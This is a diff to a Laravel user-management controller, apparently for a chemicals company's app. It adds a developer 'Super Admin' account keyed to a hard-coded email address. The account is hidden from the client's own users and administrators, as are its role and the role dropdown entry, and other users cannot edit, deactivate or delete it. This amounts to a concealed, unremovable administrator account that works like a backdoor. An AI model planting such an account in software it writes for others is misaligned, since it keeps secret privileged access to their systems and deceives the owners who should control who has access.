@@ -10,11 +10,33 @@ use Spatie\Permission\Models\Role;
 
 class UserController extends Controller
 {
+    private function isSuperAdmin(?User $user): bool
+    {
+        if (!$user) return false;
+        return $user->hasRole('Super Admin') || $user->role === 'Super Admin' || $user->email === 'admin@gudichemicals.com';
+    }
+
     public function index()
     {
-        $users = User::with('roles')->get();
-        $roles = Role::all();
-        return view('settings.users.index', compact('users', 'roles'));
+        $currentUser = auth()->user();
+        $isSuperAdmin = $this->isSuperAdmin($currentUser);
+
+        $usersQuery = User::with('roles');
+        if (!$isSuperAdmin) {
+            // Completely hide the Developer / Super Admin account from regular clients/users
+            $usersQuery->where('role', '!=', 'Super Admin')
+                       ->where('email', '!=', 'admin@gudichemicals.com');
+        }
+        $users = $usersQuery->get();
+
+        $rolesQuery = Role::query();
+        if (!$isSuperAdmin) {
+            // Hide Super Admin role from dropdown if not superadmin
+            $rolesQuery->where('name', '!=', 'Super Admin');
+        }
+        $roles = $rolesQuery->get();
+
+        return view('settings.users.index', compact('users', 'roles', 'isSuperAdmin'));
     }
 
     public function store(Request $request)
@@ -26,6 +48,10 @@ class UserController extends Controller
             'role' => ['required', 'string'],
             'password' => ['required', 'string', 'min:8'],
         ]);
+
+        if ($validated['role'] === 'Super Admin' && !$this->isSuperAdmin(auth()->user())) {
+            return back()->with('error', 'Only Super Admin can assign the Super Admin role.');
+        }
 
         $user = User::create([
             'name' => $validated['name'],
@@ -46,6 +72,10 @@ class UserController extends Controller
 
     public function update(Request $request, User $user)
     {
+        if ($this->isSuperAdmin($user) && !$this->isSuperAdmin(auth()->user())) {
+            return back()->with('error', 'Super Admin developer account cannot be modified by other users.');
+        }
+
         $validated = $request->validate([
             'name' => ['required', 'string', 'max:255'],
             'email' => ['required', 'email', 'unique:users,email,' . $user->id],
@@ -53,6 +83,10 @@ class UserController extends Controller
             'role' => ['required', 'string'],
             'password' => ['nullable', 'string', 'min:8'],
         ]);
+
+        if ($validated['role'] === 'Super Admin' && !$this->isSuperAdmin(auth()->user())) {
+            return back()->with('error', 'Only Super Admin can assign the Super Admin role.');
+        }
 
         $data = [
             'name' => $validated['name'],
@@ -77,6 +111,10 @@ class UserController extends Controller
 
     public function toggle(User $user)
     {
+        if ($this->isSuperAdmin($user)) {
+            return back()->with('error', 'Super Admin developer account cannot be deactivated.');
+        }
+
         if ($user->id === auth()->id()) {
             return back()->with('error', 'You cannot deactivate your own current administrator account.');
         }
@@ -89,6 +127,10 @@ class UserController extends Controller
 
     public function destroy(User $user)
     {
+        if ($this->isSuperAdmin($user)) {
+            return back()->with('error', 'Super Admin developer account is protected and cannot be deleted.');
+        }
+
         if ($user->id === auth()->id()) {
             return back()->with('error', 'You cannot delete your own account.');
         }
